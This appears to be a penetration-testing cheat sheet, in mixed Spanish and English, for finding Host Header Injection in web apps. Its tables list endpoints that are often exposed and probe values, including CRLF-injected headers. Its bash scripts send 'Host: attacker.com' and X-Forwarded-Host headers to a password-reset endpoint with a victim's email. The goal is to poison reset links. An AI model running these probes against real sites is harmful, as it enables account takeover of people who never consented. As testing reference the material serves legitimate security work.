---
aliases:
  - HHI Detection
  - Host Header Recon
tags:
  - vuln/host-header-injection
  - technique/discovery
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Host Header Injection]]"
---
# Host Header Injection - Detección y Reconocimiento

---

## Identificar Endpoints que Reflejan / Dependen de Host

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Reset password endpoint | `/forgot`, `/reset` — emite link en email | Most common vector. |
| Email confirmation | `/verify`, `/confirm` — enlaces al user | Same. |
| Welcome email | First-time signup email | Same. |
| Password change confirm | `/password/change` con email | Same. |
| Email magic link | Login via emailed link | High impact ATO. |
| OAuth callback URL generation | `redirect_uri` builder | OAuth chain. |
| Webhook callback construction | App generates URL para 3rd party callbacks | External calls. |
| API URL generation en docs | `/api-docs` link to base URL | Disclosure. |
| Sitemap / robots | `/sitemap.xml` con absolute URLs | SEO impact. |
| RSS feeds | Feed con absolute self-link | Same. |
| Cache headers | `Cache-Control` based on Host | Cache poisoning. |
| Redirect responses | `Location:` constructed from Host | SSRF / Open Redirect chain. |
| `<base href>` reflexion | Page source con `<base href="https://${HOST}/">` | Direct XSS / hijack. |
| Canonical link | `<link rel="canonical" href="https://${HOST}/page">` | SEO + redirect. |
| Self-referencing links | All `<a href="https://${HOST}/...">` | Asset reroute. |
| Email From / Reply-To | Constructed from Host | Email spoofing. |
| Host-based virtual host | App routes by `Host` header | Multi-tenant routing. |
^hhi-detect-endpoints

---

## Probes con Valores Arbitrarios

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| External Host | `Host: attacker.com` | Si app responde 200 + reflejes attacker.com → vulnerable. |
| Localhost | `Host: localhost` | Internal access? |
| 127.0.0.1 | `Host: 127.0.0.1` | Same. |
| Internal IP | `Host: 192.168.1.1` | Internal app routing. |
| Random subdomain | `Host: random.target.com` | If valid → wildcard / catch-all. |
| Burp Collaborator | `Host: <unique>.oast.fun` | If app fetches Host → SSRF confirmed. |
| Spaces in Host | `Host: target.com ` (trailing space) | Validation behavior. |
| Empty Host | `Host: ` | Some servers default to first vhost. |
| Multiple Host headers | `Host: target.com\r\nHost: attacker.com` | Some parsers different. |
| Port injection | `Host: target.com:1337` | Port allowed by validator? |
| URL en Host | `Host: https://attacker.com/path` | Absolute URL trick. |
| Embedded special chars | `Host: target.com\r\nX-Inject: 1` | CRLF injection. |
| Length differential | Long Host → check truncation | Edge. |
| `127.0.0.1.attacker.com` (DNS rebind) | If validation fuzzy | Subdomain abuse. |
| Trigger 400 | Malformed Host should 400 | Tolerance check. |
^hhi-detect-probes

### Probe rápido bash

```bash
# Test multiple Host values
for h in 'attacker.com' 'localhost' '127.0.0.1' 'evil.target.com.attacker.com' 'target.com:1337'; do
  echo "=== Host: $h ==="
  curl -s -I -H "Host: $h" https://target.com/ | head -5
  echo
done

# Probe password reset (typical vector)
curl -X POST -H "Host: attacker.com" \
  -d 'email=victim@target.com' \
  https://target.com/forgot
# Check if email arrives con reset link a attacker.com
```

---

## Test Multi-Header Behavior

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `X-Forwarded-Host` | `X-Forwarded-Host: attacker.com` con normal Host | Frontend strips, backend may use. |
| `X-Forwarded-Server` | Less common | Some frameworks. |
| `X-Host` | Custom header | Frequent en frameworks. |
| `X-Forwarded-For` | IP-based | Adjacent vector. |
| `X-Real-IP` | Same | Same. |
| `Forwarded:` (RFC 7239) | `Forwarded: host=attacker.com` | RFC standard. |
| `X-Original-URL` | `X-Original-URL: /admin` | IIS path override. |
| `X-Rewrite-URL` | Same | IIS variant. |
| `X-HTTP-Host-Override` | Custom | Edge. |
| Combinations | Multiple headers simultáneos | Backend may use first/last. |
| Comma-separated values | `X-Forwarded-Host: a, b` | Different servers handle differently. |
| Whitespace variants | `X-Forwarded-Host:\tattacker.com` | Tab/space. |
| Multi-level routing | Apps con multiple proxy layers | Headers stripped o forwarded? |
| `:authority` HTTP/2 pseudo | H2 equivalent of Host | H2-specific. |
| Combine con HRS | Smuggle Host injection en second request | Combo. |
^hhi-detect-multi-header

### Multi-header probe matrix

```bash
# Standard Host + alternative
HEADERS=(
  'X-Forwarded-Host'
  'X-Forwarded-Server'
  'X-Host'
  'X-HTTP-Host-Override'
  'X-Original-URL'
  'X-Rewrite-URL'
  'Forwarded'
)

for h in "${HEADERS[@]}"; do
  echo "=== $h: attacker.com ==="
  R=$(curl -s -X POST -H "$h: attacker.com" \
       -d 'email=victim@target.com' \
       https://target.com/forgot)
  # Check response patterns
  echo "$R" | grep -iE 'attacker|forgot|reset|email'
done

# Combine multiple
curl -X POST \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: attacker.com" \
  -H "X-Host: attacker.com" \
  -d 'email=victim@target.com' \
  https://target.com/forgot
```

---
